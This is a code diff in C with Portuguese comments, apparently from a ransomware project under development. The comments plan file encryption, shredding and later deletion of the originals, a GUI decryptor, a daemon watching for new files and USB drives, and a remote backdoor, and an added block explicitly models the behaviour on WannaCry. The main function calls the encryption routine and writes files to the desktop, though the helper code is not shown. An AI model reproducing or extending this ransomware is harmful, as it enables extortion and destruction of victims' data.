@@ -12,12 +12,23 @@
   criptografar arquivos - criando o novo arquivo
   shred arquivo antigo
   depois um certo tempo, excluir os arquivos antigos
-  
+  criar um decryptor com GUI
 
 
   criar daemon para procurar por novos arquivos e USB's
   
   remote backdoor
+*/
+
+/*
+  WannaCry
+  cria vários arquivos extras, README em cada pasta, private key, public key
+  criptografa os arquivos antigos, criando novo arquivo
+  shred arquivos antigos
+  sleep(60)
+  delete arquivos antigos
+
+
 */
 
 
@@ -45,11 +56,15 @@ int main(){
 
     /* start encryption */
     encrypt_files(files, &encrypted, &not_encrypted);
-    destroy(&files);
-    save_into_file_encrypted_list(encrypted, desktop);
-    destroy(&encrypted);
+    create_files_desktop(encrypted, files, desktop);
 
-    /* Free the memory */
+    
+    /* Free the linked lists*/
+    destroy(&files);
+    destroy(&encrypted);
+    destroy(&not_encrypted);
+
+    /* Free the path variables */
     free(home);
     free(desktop);
     free(username);
